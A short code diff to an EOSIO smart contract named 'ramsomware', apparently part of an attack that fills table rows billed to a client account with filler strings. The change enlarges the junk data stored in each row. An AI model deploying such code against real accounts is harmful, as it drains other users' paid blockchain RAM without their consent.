@@ -66,17 +66,18 @@ class [[eosio::contract]] ramsomware: public contract{
             addresses.emplace(client, [&]( auto& row ) 
             {
                 row.key = idx;
-                string A = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
-                row.s0 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
-                row.s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
-                row.s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
-                row.s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
-                row.s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
-                row.s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
-                row.s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
-                row.s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
-                row.s8 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
-                row.s9 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+                string A = "AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDDEEEEEEEEEEA";
+                A = A + A + A+ A;
+                row.s0 = A;
+                row.s1 = A;
+                row.s2 = A;
+                row.s3 = A;
+                row.s4 = A;
+                row.s5 = A;
+                row.s6 = A;
+                row.s7 = A;
+                row.s8 = A;
+                row.s9 = A;
             });
             printf("SUCCESS SAVE\n");
         }
